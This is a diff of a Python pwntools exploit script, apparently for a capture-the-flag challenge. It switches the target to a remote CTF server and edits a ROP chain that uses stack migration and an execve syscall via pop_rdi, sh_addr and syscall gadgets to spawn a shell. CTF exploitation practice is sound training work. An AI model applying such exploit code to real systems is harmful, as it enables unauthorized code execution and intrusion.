@@ -20,8 +20,8 @@ buf_off = 0x201020
 libc_off = 0x20830      #an address which pushed in __libc_start_main, is an addr in libc.
 stack_off = 0x206d0     #an address in stack.(main frame)
 
-r = remote('127.0.0.1',8888)
-#r = remote('csie.ctf.tw',10132)
+#r = remote('127.0.0.1',8888)
+r = remote('csie.ctf.tw',10136)
 
 #main stack 往上算第三個是&argv
 #0x7fffffffe5f8     -> 0x7fffffffe6c8 : &argv
@@ -151,6 +151,7 @@ buf = argv + 0x200
 #set rbp of libc
 write(rsp +0x8*3,buf)#stack migration
 #rop chain
+print 'br'
 write(buf,0x123456)
 write(buf+0x8*1,pop_rdi)
 write(buf+0x8*2,sh_addr)
@@ -163,13 +164,11 @@ write(buf+0x8*8,0x3b)
 write(buf+0x8*9,syscall)
 
 #
-
 write(rsp +0x8*4,leave_addr)
 
 clean_pipe()
 
 r.recvuntil(':')
-r.interactive()
 
 change_ret_main(argv,low)
 
